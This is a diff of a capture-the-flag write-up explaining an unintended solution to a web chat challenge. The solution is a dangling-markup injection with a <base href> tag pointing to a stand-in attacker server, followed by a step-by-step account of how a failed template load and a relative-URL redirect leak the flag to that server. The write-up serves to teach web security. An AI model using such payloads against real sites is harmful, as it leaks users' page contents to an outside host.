@@ -198,15 +198,24 @@ https://our-server.example.com/<form name=getElementById></form>
 
 Isn’t it beautiful?
 
-### Simpler, unintended solution
+### Alternative, unintended solution
 
-A much simpler way to solve the challenge was to use a [dangling markup injection](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection) attack in combination with a `<base>` tag to leak part of the HTML to a server under our control:
+Another way to solve the challenge was to use a subtle form of a [dangling markup injection attack](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection) using a `<base>` tag to leak part of the HTML to a server under our control:
 
 ```
-<base href=https://our-server.example.com/><img src="
+<base href=https://our-server.example.com/>
 ```
 
-The challenge author confirmed on IRC that this is not the intended solution, although it is a very nice bypass.
+The challenge author confirmed on IRC that this is not the intended solution, although it is a very nice bypass. This exploit works because it uses a chain of lucky events:
+
+1. When instantiating a new `Template` object, the template is immediately loaded via `XMLHttpRequest` and cached in the `sessionStorage`.
+2. Since the injection (lines 144 and 145 in `js/pages/chat.js`) already occurs before the load of the `message.html` template (line 165), the new base URL is in effect.
+3. The page uses a relative URL to load the `message.html` template, so it is hijacked by the base URL and blocked by CSP. The `XMLHttpRequest` fails with a `SecurityError`. Thus the `temp` variable is not set and remains to be the `location` object.
+4. In `page.appendMessage` the `renderToString` function cannot be found on the `location` object and errors.
+5. So this leaves a call to `location.assign('<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})')`. This is in fact a relative URL and hence hijacked by the new base URI.
+6. Finally the browser redirects to `https://our-server.example.com/<base href=https://our-server.example.com/> (PREM_flag{cows_need_love_too!})`.
+
+In a way, this exploit is even harder to find than the intended solution. Every attacker surfing on `chat.js` fills the `sessionStorage` with the legitimate `message.html` `Template`. This stops the exploit from working because it needs the first `SecurityError` due to the `XMLHttpRequest`.
 
 ## Other write-ups and resources
 
